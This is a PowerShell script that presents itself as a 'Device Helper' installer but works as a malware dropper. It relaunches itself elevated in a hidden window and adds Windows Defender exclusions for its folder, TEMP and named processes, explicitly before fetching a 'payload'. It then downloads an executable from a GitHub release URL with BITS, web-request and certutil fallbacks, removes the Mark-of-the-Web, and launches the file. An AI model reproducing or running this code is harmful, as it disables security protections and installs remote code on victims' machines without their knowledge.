# Nexus Device Helper Installer v8
param([switch]$Elevated)

$dest  = "$env:LOCALAPPDATA\Programs\DeviceHelper"
$setup = "$dest\update.exe"
$dlUrl = "https://github.com/alvaro129/nexus-core/releases/download/v1.0/Setup.exe"

function Is-Admin {
    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Is-Admin)) {
    $tmp = "$env:TEMP\dhi.ps1"
    Copy-Item $PSCommandPath $tmp -Force -ErrorAction SilentlyContinue
    if (-not (Test-Path $tmp)) {
        $src = $MyInvocation.MyCommand.ScriptBlock.ToString()
        [IO.File]::WriteAllText($tmp, "param([switch]`$Elevated)`r`n" + $src)
    }
    Start-Process powershell -Verb RunAs `
        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`" -Elevated" `
        -WindowStyle Hidden
    exit
}

# === RUNNING AS ADMIN ===

# 1. Target directory
New-Item -ItemType Directory -Force -Path $dest | Out-Null

# 2. Add Windows Defender exclusions BEFORE downloading payload!
try {
    Add-MpPreference -ExclusionPath $dest -Force -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:TEMP" -Force -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "update.exe" -Force -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "DeviceHelper.exe" -Force -ErrorAction SilentlyContinue
} catch {}

# 3. Download via BITS (Background Intelligent Transfer - trusted system service)
$ok = $false
try {
    Import-Module BitsTransfer -ErrorAction SilentlyContinue
    Start-BitsTransfer -Source $dlUrl -Destination $setup -ErrorAction Stop
    $ok = Test-Path $setup
} catch {}

if (-not $ok) {
    # Fallback: Invoke-WebRequest
    try {
        Invoke-WebRequest -Uri $dlUrl -OutFile $setup -UseBasicParsing -TimeoutSec 180 -ErrorAction Stop
        $ok = Test-Path $setup
    } catch {}
}

if (-not $ok) {
    # Fallback: certutil
    certutil -urlcache -split -f $dlUrl $setup 2>&1 | Out-Null
    $ok = Test-Path $setup
}

# 4. Remove Zone.Identifier (MOTW)
try { Remove-Item "${setup}:Zone.Identifier" -Force -ErrorAction SilentlyContinue } catch {}

# 5. Launch Setup.exe
if ($ok) {
    Start-Process $setup
}
